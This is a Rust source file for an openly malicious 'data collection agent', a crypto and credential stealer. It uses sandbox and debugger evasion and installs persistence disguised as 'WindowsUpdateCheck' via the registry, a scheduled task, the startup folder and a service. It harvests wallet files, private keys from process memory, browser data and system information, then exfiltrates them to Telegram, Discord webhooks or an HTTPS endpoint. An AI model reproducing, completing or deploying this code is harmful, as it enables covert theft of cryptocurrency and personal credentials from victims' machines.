//! hmm_core_agent - Data Collection Agent
//!
//! A modular data collection system that:
//! 1. Extracts data from wallets, browsers, and system
//! 2. Processes and compresses the data
//! 3. Stores results locally
//! 4. Optionally exfiltrates to remote endpoint via HTTPS, Telegram, or Discord

use std::sync::Arc;

use hmm_core_agent::module::core::{CoreConfig, CoreError, DataContext, FnTask, Orchestrator, CancellationToken, CoreTask};
use hmm_core_agent::module::evasion::{EvasionConfig, EvasionTask};
use hmm_core_agent::module::extractor::{
    BrowserExtractor, MemoryExtractor, SystemExtractor, WalletExtractor, Confidence,
};
use hmm_core_agent::module::persistence::{
    PersistenceMethod, RegistryPersistence,
    ScheduledTaskPersistence, StartupFolderPersistence,
    ServicePersistence,
};
use hmm_core_agent::module::persistence::registry::RegistryPersistenceConfig;
use hmm_core_agent::module::persistence::scheduled_task::{ScheduledTaskConfig, TaskTrigger};
use hmm_core_agent::module::persistence::startup::StartupFolderConfig;
use hmm_core_agent::module::persistence::service::{ServiceConfig, ServiceStartup};
use hmm_core_agent::module::processing::{
    ProcessingPipeline, ProcessingConfig, CompressionMode,
};
use hmm_core_agent::module::storage::{LocalStore, LocalStoreConfig};
use hmm_core_agent::module::transport::{
    TransportClient, TransportConfig, UploadRequest,
    TelegramClient, DiscordClient, DiscordEmbed,
};
use log::{error, info, warn};

fn main() {
    let _ = env_logger::Builder::from_env(
        env_logger::Env::default().default_filter_or("info"),
    )
    .try_init();

    let config = CoreConfig::from_env().unwrap_or_default();
    
    // STEP 1: Run evasion checks FIRST (synchronously, before any other tasks)
    // This ensures we abort early if running in a VM, debugger, or sandbox
    info!("Running evasion detection checks...");
    let evasion_task = EvasionTask::new(EvasionConfig::default());
    match evasion_task.run_with_cancel(&config, &CancellationToken::new()) {
        Ok(()) => {
            info!("Evasion checks passed - environment appears safe");
        }
        Err(e) => {
            error!("Evasion checks failed: {}", e);
            eprintln!("Evasion checks failed: {}", e);
            eprintln!("Aborting execution - possible analysis environment detected");
            return; // Abort immediately - do not run any other tasks
        }
    }

    // STEP 2: Create orchestrator for remaining tasks
    let mut orchestrator = Orchestrator::new(config.clone()).expect("valid orchestrator config");

    // Create shared data context for pipeline
    let data_context = Arc::new(DataContext::new());

    // STEP 3: Register persistence task (optional, runs after evasion check)
    // Persistence is registered but can be enabled/disabled via environment variable
    if std::env::var("HMM_ENABLE_PERSISTENCE").unwrap_or_default() == "1" {
        info!("Persistence enabled via HMM_ENABLE_PERSISTENCE=1");
        
        let persistence_methods = vec![
            // Registry Run key (current user, no admin required)
            FnTask::new("persist_registry", |_cfg, cancel| {
                if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
                
                info!("Attempting registry persistence...");
                let exe_path = std::env::current_exe()
                    .map(|p| p.display().to_string())
                    .unwrap_or_else(|_| String::new());
                
                if exe_path.is_empty() {
                    return Err(CoreError::TaskFailed {
                        task: "persist_registry".to_string(),
                        reason: "Could not determine executable path".to_string(),
                    });
                }
                
                let config = RegistryPersistenceConfig::for_current_user(
                    "WindowsUpdateCheck",
                    &exe_path,
                );
                
                match RegistryPersistence::install(&config) {
                    Ok(result) => {
                        info!("Registry persistence installed: {:?}", result.identifier);
                        if let Some(cleanup) = result.cleanup_command {
                            info!("Cleanup command: {}", cleanup);
                        }
                        Ok(())
                    }
                    Err(e) => {
                        warn!("Registry persistence failed: {}", e);
                        Err(CoreError::TaskFailed {
                            task: "persist_registry".to_string(),
                            reason: e.to_string(),
                        })
                    }
                }
            }),
            // Scheduled task (at logon)
            FnTask::new("persist_scheduled_task", |_cfg, cancel| {
                if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
                
                info!("Attempting scheduled task persistence...");
                let exe_path = std::env::current_exe()
                    .map(|p| p.display().to_string())
                    .unwrap_or_else(|_| String::new());
                
                if exe_path.is_empty() {
                    return Err(CoreError::TaskFailed {
                        task: "persist_scheduled_task".to_string(),
                        reason: "Could not determine executable path".to_string(),
                    });
                }
                
                let config = ScheduledTaskConfig::at_logon(
                    "WindowsUpdateCheck",
                    &exe_path,
                )
                .with_arguments("--silent");
                
                match ScheduledTaskPersistence::install(&config) {
                    Ok(result) => {
                        info!("Scheduled task persistence installed: {:?}", result.identifier);
                        Ok(())
                    }
                    Err(e) => {
                        warn!("Scheduled task persistence failed: {}", e);
                        Err(CoreError::TaskFailed {
                            task: "persist_scheduled_task".to_string(),
                            reason: e.to_string(),
                        })
                    }
                }
            }),
            // Startup folder (Windows only)
            FnTask::new("persist_startup", |_cfg, cancel| {
                if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
                
                info!("Attempting startup folder persistence...");
                let exe_path = std::env::current_exe()
                    .map(|p| p.display().to_string())
                    .unwrap_or_else(|_| String::new());
                
                if exe_path.is_empty() {
                    return Err(CoreError::TaskFailed {
                        task: "persist_startup".to_string(),
                        reason: "Could not determine executable path".to_string(),
                    });
                }
                
                let config = StartupFolderConfig::for_current_user(
                    "WindowsUpdateCheck",
                    &exe_path,
                );
                
                match StartupFolderPersistence::install(&config) {
                    Ok(result) => {
                        info!("Startup folder persistence installed: {:?}", result.identifier);
                        Ok(())
                    }
                    Err(e) => {
                        warn!("Startup folder persistence failed: {}", e);
                        Err(CoreError::TaskFailed {
                            task: "persist_startup".to_string(),
                            reason: e.to_string(),
                        })
                    }
                }
            }),
            // Service installation (requires admin)
            FnTask::new("persist_service", |_cfg, cancel| {
                if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
                
                info!("Attempting service persistence...");
                let exe_path = std::env::current_exe()
                    .map(|p| p.display().to_string())
                    .unwrap_or_else(|_| String::new());
                
                if exe_path.is_empty() {
                    return Err(CoreError::TaskFailed {
                        task: "persist_service".to_string(),
                        reason: "Could not determine executable path".to_string(),
                    });
                }
                
                let config = ServiceConfig::new(
                    "WindowsUpdateService",
                    "Windows Update Check Service",
                    &exe_path,
                )
                .with_description("Checks for Windows updates periodically")
                .with_startup(ServiceStartup::Automatic);
                
                match ServicePersistence::install(&config) {
                    Ok(result) => {
                        info!("Service persistence installed: {:?}", result.identifier);
                        // Try to start the service
                        if let Err(e) = ServicePersistence::start("WindowsUpdateService") {
                            warn!("Failed to start service: {}", e);
                        }
                        Ok(())
                    }
                    Err(e) => {
                        warn!("Service persistence failed (may require admin): {}", e);
                        Err(CoreError::TaskFailed {
                            task: "persist_service".to_string(),
                            reason: e.to_string(),
                        })
                    }
                }
            }),
        ];
        
        // Register all persistence methods
        for task in persistence_methods {
            orchestrator.register_task(task);
        }
    } else {
        info!("Persistence disabled (set HMM_ENABLE_PERSISTENCE=1 to enable)");
    }

    // Register extraction tasks - these add records to the shared context
    let ctx_wallet = Arc::clone(&data_context);
    orchestrator.register_task(FnTask::new("extract_wallets", move |_cfg, cancel| {
        if cancel.is_cancelled() { return Err(CoreError::Cancelled); }

        info!("Extracting wallet data...");
        let extractor = WalletExtractor::new(false);
        let results = extractor.extract_all();

        let mut total_records = 0;
        for result in results {
            if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
            if result.success {
                let data_len = result.data.len();
                // Convert extraction results to DataRecords and add to context
                for item in result.data {
                    let record = hmm_core_agent::module::processing::types::DataRecord {
                        source: "wallet".to_string(),
                        kind: format!("{:?}:{:?}", item.target, item.name),
                        payload: item.content,
                        metadata: item.metadata.clone(),
                    };
                    let _ = ctx_wallet.add_records(vec![record]);
                    total_records += 1;
                }
                info!("Extracted {} wallet files", data_len);
            } else {
                warn!(
                    "Wallet extraction failed: {}",
                    result.error.unwrap_or_else(|| "unknown error".to_string())
                );
            }
        }

        info!("Wallet extraction complete: {} records added to context", total_records);
        Ok(())
    }));

    // Register memory extraction task
    let ctx_memory = Arc::clone(&data_context);
    orchestrator.register_task(FnTask::new("extract_memory", move |_cfg, cancel| {
        if cancel.is_cancelled() { return Err(CoreError::Cancelled); }

        info!("Scanning process memory for private keys...");

        let extractor = MemoryExtractor::new(Confidence::Low, 100);
        let results = extractor.extract_all();

        let mut total_records = 0;
        for result in results {
            if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
            if result.success {
                for item in result.data {
                    let mut metadata = item.metadata.clone();
                    metadata.insert("source".to_string(), "memory_scan".to_string());
                    
                    let record = hmm_core_agent::module::processing::types::DataRecord {
                        source: "memory".to_string(),
                        kind: metadata.get("key_type").cloned().unwrap_or_else(|| "unknown".to_string()),
                        payload: item.content,
                        metadata,
                    };
                    let _ = ctx_memory.add_records(vec![record]);
                    total_records += 1;
                }
            } else {
                warn!(
                    "Memory extraction failed: {}",
                    result.error.unwrap_or_else(|| "unknown error".to_string())
                );
            }
        }

        info!("Memory scan complete: {} records added to context", total_records);
        Ok(())
    }));

    let ctx_browsers = Arc::clone(&data_context);
    orchestrator.register_task(FnTask::new("extract_browsers", move |_cfg, cancel| {
        if cancel.is_cancelled() { return Err(CoreError::Cancelled); }

        info!("Extracting browser data...");
        let extractor = BrowserExtractor::new(true, true, false);
        let results = extractor.extract_all();

        let mut total_records = 0;
        for result in results {
            if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
            if result.success {
                let data_len = result.data.len();
                for item in result.data {
                    let record = hmm_core_agent::module::processing::types::DataRecord {
                        source: "browser".to_string(),
                        kind: format!("{:?}:{:?}", item.target, item.name),
                        payload: item.content,
                        metadata: item.metadata.clone(),
                    };
                    let _ = ctx_browsers.add_records(vec![record]);
                    total_records += 1;
                }
                info!("Extracted {} browser data items", data_len);
            } else {
                warn!(
                    "Browser extraction failed: {}",
                    result.error.unwrap_or_else(|| "unknown error".to_string())
                );
            }
        }

        info!("Browser extraction complete: {} records added to context", total_records);
        Ok(())
    }));

    let ctx_system = Arc::clone(&data_context);
    orchestrator.register_task(FnTask::new("extract_system", move |_cfg, cancel| {
        if cancel.is_cancelled() { return Err(CoreError::Cancelled); }

        info!("Extracting system information...");
        let extractor = SystemExtractor::new();
        let results = extractor.extract_all();

        let mut total_records = 0;
        for result in results {
            if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
            if result.success {
                for item in result.data {
                    let record = hmm_core_agent::module::processing::types::DataRecord {
                        source: "system".to_string(),
                        kind: "system_info".to_string(),
                        payload: item.content,
                        metadata: item.metadata.clone(),
                    };
                    let _ = ctx_system.add_records(vec![record]);
                    total_records += 1;
                }
            } else {
                warn!(
                    "System extraction failed: {}",
                    result.error.unwrap_or_else(|| "unknown error".to_string())
                );
            }
        }

        info!("System extraction complete: {} records added to context", total_records);
        Ok(())
    }));

    // Register processing task - processes records from context
    let ctx_process = Arc::clone(&data_context);
    orchestrator.register_task(FnTask::new("process_data", move |_cfg, cancel| {
        if cancel.is_cancelled() { return Err(CoreError::Cancelled); }

        info!("Processing collected data...");

        // Get records from context
        let records = ctx_process.get_records()
            .map_err(|e| CoreError::TaskFailed {
                task: "process_data".to_string(),
                reason: format!("Failed to get records from context: {}", e),
            })?;

        let record_count = records.len();
        if record_count == 0 {
            warn!("No records to process");
            return Ok(());
        }

        info!("Processing {} records from context", record_count);

        let processing_config = ProcessingConfig {
            compression: CompressionMode::Gzip,
            encryption_key: None,
        };

        let pipeline = ProcessingPipeline::new(processing_config)
            .map_err(|e| CoreError::TaskFailed {
                task: "process_data".to_string(),
                reason: e.to_string(),
            })?;

        // Process all records through the pipeline
        let bundle = pipeline.process(&records)
            .map_err(|e| CoreError::TaskFailed {
                task: "process_data".to_string(),
                reason: format!("Processing failed: {}", e),
            })?;

        info!(
            "Processing complete: {} records -> {} bytes (compressed={}, encrypted={})",
            bundle.records.len(),
            bundle.payload.len(),
            bundle.compressed,
            bundle.encrypted
        );

        // Store processed payload in context for storage task
        ctx_process.add_payload(bundle.payload)
            .map_err(|e| CoreError::TaskFailed {
                task: "process_data".to_string(),
                reason: format!("Failed to store payload in context: {}", e),
            })?;

        Ok(())
    }));

    // Register storage task - saves payloads from context
    let ctx_store = Arc::clone(&data_context);
    orchestrator.register_task(FnTask::new("store_data", move |_cfg, cancel| {
        if cancel.is_cancelled() { return Err(CoreError::Cancelled); }

        info!("Storing collected data...");

        let store_config = LocalStoreConfig {
            root_dir: std::env::temp_dir().join("hmm_agent"),
            max_archives: 10,
        };

        let store = LocalStore::new(store_config.clone())
            .map_err(|e| CoreError::TaskFailed {
                task: "store_data".to_string(),
                reason: e.to_string(),
            })?;

        info!("Storage initialized at {:?}", store_config.root_dir);

        // Get payloads from context and save them
        let payloads = ctx_store.get_payloads()
            .map_err(|e| CoreError::TaskFailed {
                task: "store_data".to_string(),
                reason: format!("Failed to get payloads from context: {}", e),
            })?;

        if payloads.is_empty() {
            warn!("No payloads to store");
            return Ok(());
        }

        let mut stored_count = 0;
        for (i, payload) in payloads.iter().enumerate() {
            if cancel.is_cancelled() { return Err(CoreError::Cancelled); }

            match store.save(payload) {
                Ok(record) => {
                    info!("Stored payload {} at {:?}", i, record.path);
                    let _ = ctx_store.add_storage_path(record.path.display().to_string());
                    stored_count += 1;
                }
                Err(e) => {
                    warn!("Failed to store payload {}: {}", i, e);
                }
            }
        }

        info!("Storage complete: {} payloads saved", stored_count);
        Ok(())
    }));

    // Register transport task (supports multiple backends)
    let transport_endpoint = std::env::var("HMM_TRANSPORT_ENDPOINT").ok();
    let transport_api_key = std::env::var("HMM_TRANSPORT_API_KEY").ok();

    if let Some(ref endpoint) = transport_endpoint {
        if !endpoint.is_empty() {
            let endpoint_clone = endpoint.clone();
            let api_key = transport_api_key.clone();
            let ctx_transport = Arc::clone(&data_context);

            // Determine transport type from endpoint prefix
            let transport_type = if endpoint_clone.starts_with("telegram://") {
                "Telegram"
            } else if endpoint_clone.starts_with("discord://") {
                "Discord"
            } else {
                "HTTPS"
            };

            orchestrator.register_task(FnTask::new("exfiltrate_data", move |_cfg, cancel| {
                if cancel.is_cancelled() { return Err(CoreError::Cancelled); }

                info!("Exfiltrating data via {} to {}", transport_type, endpoint_clone);

                // Get payloads from context for upload
                let payloads = ctx_transport.get_payloads()
                    .map_err(|e| CoreError::TaskFailed {
                        task: "exfiltrate_data".to_string(),
                        reason: format!("Failed to get payloads from context: {}", e),
                    })?;

                if payloads.is_empty() {
                    warn!("No payloads to exfiltrate");
                    return Ok(());
                }

                let result = match transport_type {
                    "Telegram" => {
                        // Parse Telegram endpoint: telegram://BOT_TOKEN/CHAT_ID
                        let parts: Vec<&str> = endpoint_clone
                            .trim_start_matches("telegram://")
                            .split('/')
                            .collect();

                        if parts.len() < 2 {
                            error!("Invalid Telegram endpoint format. Expected: telegram://BOT_TOKEN/CHAT_ID");
                            return Err(CoreError::TaskFailed {
                                task: "exfiltrate_data".to_string(),
                                reason: "Invalid Telegram endpoint format".to_string(),
                            });
                        }

                        let client = TelegramClient::new(parts[0], parts[1]);

                        // Send notification message with summary
                        let summary = ctx_transport.get_summary().map_err(|e| CoreError::TaskFailed {
                            task: "exfiltrate_data".to_string(),
                            reason: format!("Failed to get context summary: {}", e),
                        })?;

                        let message = format!(
                            "📦 New wallet data extracted\n\
                             Records: {}\n\
                             Payloads: {}\n\
                             Total size: {} bytes",
                            summary.record_count,
                            summary.payload_count,
                            summary.total_payload_bytes
                        );

                        match client.send_message(&message) {
                            Ok(_) => info!("Telegram notification sent"),
                            Err(e) => warn!("Failed to send Telegram message: {}", e),
                        }

                        // Upload actual payloads as documents
                        for (i, payload) in payloads.iter().enumerate() {
                            let filename = format!("wallet_data_{}.bin", i);
                            match client.send_file(payload, &filename, None) {
                                Ok(_) => info!("Telegram document {} uploaded", i),
                                Err(e) => warn!("Failed to upload Telegram document {}: {}", i, e),
                            }
                        }

                        Ok(())
                    }
                    "Discord" => {
                        // Parse Discord endpoint: discord://WEBHOOK_URL
                        let webhook_url = endpoint_clone.trim_start_matches("discord://");

                        let client = DiscordClient::new(webhook_url)
                            .map_err(|e| CoreError::TaskFailed {
                                task: "exfiltrate_data".to_string(),
                                reason: e.to_string(),
                            })?;

                        // Get summary for embed
                        let summary = ctx_transport.get_summary().map_err(|e| CoreError::TaskFailed {
                            task: "exfiltrate_data".to_string(),
                            reason: format!("Failed to get context summary: {}", e),
                        })?;

                        // Send notification embed
                        let embed = DiscordEmbed::new()
                            .with_title("📦 Wallet Data Extracted")
                            .with_description(&format!(
                                "Records: {}\nPayloads: {}\nSize: {} bytes",
                                summary.record_count,
                                summary.payload_count,
                                summary.total_payload_bytes
                            ))
                            .with_color(0x00FF00);

                        match client.send_embed(embed) {
                            Ok(_) => info!("Discord notification sent"),
                            Err(e) => warn!("Failed to send Discord embed: {}", e),
                        }

                        // Upload payloads as files
                        for (i, payload) in payloads.iter().enumerate() {
                            let filename = format!("wallet_data_{}.bin", i);
                            match client.send_file(payload, &filename, None) {
                                Ok(_) => info!("Discord file {} uploaded", i),
                                Err(e) => warn!("Failed to upload Discord file {}: {}", i, e),
                            }
                        }

                        Ok(())
                    }
                    _ => {
                        // HTTPS transport
                        let transport_config = TransportConfig {
                            enabled: true,
                            endpoint: Some(endpoint_clone.clone()),
                            api_key: api_key.clone(),
                            max_retries: 3,
                            retry_backoff: std::time::Duration::from_secs(1),
                            timeout: std::time::Duration::from_secs(30),
                        };

                        let client = TransportClient::new(transport_config)
                            .map_err(|e| CoreError::TaskFailed {
                                task: "exfiltrate_data".to_string(),
                                reason: e.to_string(),
                            })?;

                        // Upload each payload
                        for (i, payload) in payloads.iter().enumerate() {
                            let request = UploadRequest {
                                content_type: "application/octet-stream".to_string(),
                                payload: payload.clone(),
                            };

                            match client.upload(&request) {
                                Ok(response) => {
                                    info!("HTTPS upload {} complete: {:?}", i, response);
                                }
                                Err(e) => {
                                    warn!("Failed to upload payload {}: {}", i, e);
                                }
                            }
                        }

                        Ok(())
                    }
                };

                result
            }));
        }
    }

    // Run the orchestrator
    match orchestrator.run() {
        Ok(stats) => {
            // Print final summary
            let summary = data_context.get_summary().unwrap_or_default();
            info!(
                "Agent completed: total={}, succeeded={}, failed={}",
                stats.tasks_total, stats.tasks_succeeded, stats.tasks_failed
            );
            info!(
                "Data summary: records={}, payloads={}, total_bytes={}",
                summary.record_count,
                summary.payload_count,
                summary.total_payload_bytes
            );
            println!(
                "Agent completed: total={}, succeeded={}, failed={}",
                stats.tasks_total, stats.tasks_succeeded, stats.tasks_failed
            );
            println!(
                "Data summary: records={}, payloads={}, total_bytes={}",
                summary.record_count,
                summary.payload_count,
                summary.total_payload_bytes
            );
        }
        Err(err) => {
            error!("Agent failed: {err}");
            eprintln!("Agent failed: {err}");
        }
    }
}
